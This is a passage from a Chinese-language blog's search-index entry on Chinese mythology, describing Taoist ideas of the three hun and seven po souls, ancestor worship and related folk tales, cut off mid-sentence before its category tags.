<h3 id="冥界篇-1"><a class="header-anchor" href="#冥界篇-1">¶</a>冥界篇 1</h3>
<ul>
<li>
<p>由于中国人喜欢记录历史，神话人物大部分以历史人物为雏形衍生的，例如三皇五帝就是以部落或者部落首领的名字来创作的神话。</p>
</li>
<li>
<p>中华民族还有着楚国屈原记录的《九歌》神话。</p>
<ul>
<li>
<p>在九歌之中，东皇太一是至高主神；</p>
</li>
<li>
<p>而在《山海经》中，则以女娲、帝俊为主神；</p>
</li>
<li>
<p>盘古开天的神话却要直到三国时期由徐整所著的《三五历纪》中才出现，比在战国时期的《山海经》雏形要晚了几百年。</p>
</li>
</ul>
</li>
<li>
<p>十几代人的时间差使得中国神话主神与诸神的关系模糊不清，再加上道教、佛教、儒家思想对于神话的梳理与编纂，中国神话的主要脉络很难梳理。</p>
</li>
<li></li>
<li>
<p>传说商朝人好鬼神，每逢有战事或国家大事，帝王都会去往祖陵或祭台由祭司进行占卜。最为主流的占卜是将龟甲打磨抛光之后，由祭司投入紫荆木点燃的火焰之中，以龟甲之上的裂痕来判断吉凶，并以吉凶来判断接下来人们该怎样行事。这里的占卜出的结果，就是上天和鬼神们所给人的答案。</p>
</li>
<li>
<p>“社稷大事，唯祀与戎”</p>
</li>
<li>
<p>但随着时间的流逝，这一类的占卜之术逐渐的失传，变为了其他形式。</p>
</li>
<li>
<p>到了汉朝时，帝王独尊儒术，圣人孔子不说鬼神。此时，对于鬼神的解释之权落到了道家的手中。道家以老子学说，结合阴阳五行，乾坤八卦思想，再加上古人对于天地自然的观测与想象，这才衍生出了三魂七魄的观念。</p>
</li>
<li>
<p>这个观念之所以能保留下来，也是因为皇权与儒家选择的结果。中国人敬拜祖先，因此还有了清明节和中元节这一类祭奠逝者的节日。</p>
</li>
<li>
<p>在三魂七魄的观念未出现之前，不说鬼神的儒家一直无法解释大家到底在祭拜什么。直到三魂七魄观念的出现，才打破这一僵局。</p>
</li>
<li></li>
<li></li>
<li>
<p>三魂，分别是天魂胎光、地魂爽灵、人魂幽精。</p>
</li>
<li>
<p>传说在人没有出生之前，人魂由神明专司保管。当人体形成，人魂就会进入到肉体之中，此时，天地阴阳之精气也会形成人的魂魄，从而辅助人魂的成长。随着人本身的成长，天地人三魂也会有着同样的记忆、行为与性格。</p>
</li>
<li></li>
<li>
<p>一个传说之中的故事：明太祖朱元璋有一次被一个冒失的太监吓了一跳，于是命人将太监拖出去斩首，当时这个太监吓得面无血色。在斩首之时，人们惊讶的发现，斩首台之下竟然有一个长的和太监一模一样的人在那里看热闹。在太监被斩首的前一刻，朱元璋又下旨赦免了这个太监。也是这一吓，将太监的一个魂吓掉了，幻化出来另一个一模一样的自己并较有兴致的观看自己被斩首。</p>
</li>
<li>
<p>而在人死后，天魂和地魂的精气会再度回归到天地之中。丧失本源精气的这两个魂，一个会守护在自己的尸身旁边，一个会去到子孙后代供奉的牌位之中，接受子孙的敬拜与祭祀，而人魂则会被专司灵魂的神明拘走，从而为自己生前的善果和恶行负责；依附在尸身与牌位旁的魂，会像是一个监视器一样在灵位与坟墓旁边观看子孙的言行，观察子孙是否遵纪守法，心向善而不作恶，并保佑这些子孙健康的成长</p>
</li>
<li>
<p>这套说法之所以能够大面积地流行，很大原因取决于儒家接受了三魂这一设定，认为人每当清明节祭祀祖先的时候，都是在祭祀祖先肉体死亡后留下来的那个魂（此处可以指先祖的精神）</p>
</li>
<li>
<p>但对于祖先的祭祀也有规矩：先祖们只能够接受自己直系血脉的祭祀。这个观点来自于古代人对血缘观念的认识。</p>
</li>
<li>
<p>民间也有流传这样一个传说故事：据说一个地方的县太守手下有一个异人，这个人天生可以看到各家祖先的祭祀情况，县太守便命此人观察自家祭祀香火情况。当县太守的儿子为自家祖先上香之后，这个人却说他看到一个屠夫模样的魂进入到太守的祖庙大吃大喝，而旁边穿着官服的县太守本家的祖先，却饿的瘦骨嶙峋在家庙前徘徊。县太守于是逼问妻子，才得知当年生的是女儿，与屠夫家的女人换了孩子。</p>
</li>
<li>
<p>由这个故事可见中国文化中对直系子孙的重视，因此还产生了“不孝有三，无后为大”的言论。虽然故事中由重男轻女的陈腐观念，但也可以从中看出鬼神文化对古人生活的影响。</p>
</li>
<li>
<p>在<strong>道家</strong>系统中，三魂是阳之所属，相对应的七魄则是阴所在。七魄各自都有名称，分别是尸狗、伏矢、雀阴、吞贼、非毒、除秽、臭肺。七魄各自负责人们的喜、怒、哀、惧、爱、恶、欲七种主要的情绪。</p>
</li>
<li>
<p>传说在平日里，都是由三魂来掌控七魄，致使七魄不敢为非作歹使人沉浸于情欲之中。但当三魂受到严重打击而衰弱之时，三魂无力掌控七魄，</p>
</li>
</ul>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>中国史</category>
        <category>中国神话</category>
        <category>冥界篇</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>世界史</tag>
        <tag>中国神话</tag>
        <tag>冥界篇</tag>
      </tags>
  </entry>
</search>
